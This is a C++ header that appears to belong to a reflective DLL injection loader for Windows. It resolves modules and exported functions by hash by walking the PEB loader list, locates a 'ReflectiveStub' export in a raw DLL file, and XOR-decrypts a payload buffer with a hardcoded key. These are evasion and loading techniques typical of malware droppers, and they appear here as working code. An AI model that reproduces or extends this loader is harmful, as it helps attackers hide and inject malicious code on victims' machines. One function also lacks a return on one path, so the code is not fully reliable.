#pragma once
#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include "Hashing.hpp"


#define REFLECTIVE_FUNCTION "?ReflectiveStub@@YA_NXZ"


void* GetProcAddressH(HMODULE ModuleBase, std::uint32_t FunctionHash) {

	byte* Base = reinterpret_cast<byte*>(ModuleBase);

	PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(Base + ((PIMAGE_DOS_HEADER)Base)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return nullptr;


	PIMAGE_EXPORT_DIRECTORY pImgExportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY> \
		(Base + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


	std::uint32_t* Names = reinterpret_cast<std::uint32_t*>(Base + pImgExportDirectory->AddressOfNames);
	std::uint32_t* Addresses = reinterpret_cast<std::uint32_t*>(Base + pImgExportDirectory->AddressOfFunctions);
	std::uint16_t* Ordinals = reinterpret_cast<std::uint16_t*>(Base + pImgExportDirectory->AddressOfNameOrdinals);

	
	for (size_t i = 0; i < pImgExportDirectory->NumberOfFunctions; i++) {

		char* Name = (char*)(Base + Names[i]);
		void* Address = (void*)(Base + Addresses[Ordinals[i]]);
		
		if (JenkinsHash(Name, NULL) == FunctionHash)
			return Address;
	}

	return nullptr;
}



byte* GetModuleHandleH(std::uint32_t ModuleHash) {

	PPEB pPeb = (PPEB)__readgsqword(0x60);


	PLDR_DATA_TABLE_ENTRY pDataEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pPeb->Ldr->InMemoryOrderModuleList.Flink);
	PLIST_ENTRY pListHead = reinterpret_cast<PLIST_ENTRY>(&(pPeb->Ldr->InMemoryOrderModuleList));
	PLIST_ENTRY pItr = reinterpret_cast<PLIST_ENTRY>(pListHead->Flink);


	do {

		if (pDataEntry->FullDllName.Length) {

			if (JenkinsHash(NULL, pDataEntry->FullDllName.Buffer) == ModuleHash) {
				return static_cast<byte*>(pDataEntry->Reserved2[0]);
				break;
			}
		}

		pDataEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pItr->Flink);
		pItr = (PLIST_ENTRY)(pItr->Flink);


	} while (pItr != pListHead);

	return nullptr;
}



void _RtlInitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc) {	//0xfffc is the maximum length permitted by microsoft for this struct
			Length = 0xfffc;
		}

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR); //Account for null terminator.
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}



std::uint32_t getFileOffsetFromRva(std::uint32_t RVA, _In_ byte* fileBase) {

	PIMAGE_NT_HEADERS pImgNtHdrs = nullptr;
	PIMAGE_SECTION_HEADER pImgSecHdr = nullptr;


	pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(fileBase + ((PIMAGE_DOS_HEADER)fileBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}


	pImgSecHdr = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<uint64_t>\
		(&pImgNtHdrs->OptionalHeader) + (pImgNtHdrs->FileHeader.SizeOfOptionalHeader));


	for (size_t i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if (RVA >= pImgSecHdr[i].VirtualAddress && RVA < (pImgSecHdr[i].VirtualAddress + pImgSecHdr[i].Misc.VirtualSize)) {

			return (RVA - pImgSecHdr[i].VirtualAddress) + pImgSecHdr[i].PointerToRawData;
		}
	}
}



std::uint32_t getReflectiveFunctionRawOffset(byte* fileBase, const char* reflectiveFunctionName) {


	PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(fileBase + ((PIMAGE_DOS_HEADER)fileBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}


	PIMAGE_EXPORT_DIRECTORY pImgExportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>
		(fileBase + getFileOffsetFromRva(pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, fileBase));


	std::uint32_t* funcNameArr = (std::uint32_t*)(fileBase + getFileOffsetFromRva(pImgExportDir->AddressOfNames, fileBase));
	std::uint32_t* funcAddressArr = (std::uint32_t*)(fileBase + getFileOffsetFromRva(pImgExportDir->AddressOfFunctions, fileBase));
	std::uint16_t* funcOrdinalArr = (std::uint16_t*)(fileBase + getFileOffsetFromRva(pImgExportDir->AddressOfNameOrdinals, fileBase));


	for (size_t i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		char* funcName = reinterpret_cast<char*>(fileBase + getFileOffsetFromRva(funcNameArr[i], fileBase));

		if (strcmp(funcName, reflectiveFunctionName) == 0) {

			return getFileOffsetFromRva(funcAddressArr[funcOrdinalArr[i]], fileBase);
		}
	}

	return NULL;
}




void Decrypt(byte* PayloadBuffer,
	size_t payloadSize) { //extremely rudimentary encryption via XOR

	const unsigned char Key[] = "dcsdalytvwcvlzwq";

	for (size_t i = 0, j = 0; i < payloadSize; j++, i++) {

		if (j >= sizeof(Key) - 1) {
			j = 0;
		}

		PayloadBuffer[i] ^= Key[j];
	}
}


/*
void PrintHex(byte* Buffer, size_t BufferSize) {

	for (size_t i = 0, k = 0; i < BufferSize; i++, k++) {

		if (k == 16) {
			k = 0;
			printf("\n");
		}

		printf("%0.2X ", Buffer[i]);
	}

	printf("\n\n\n\n");
}
*/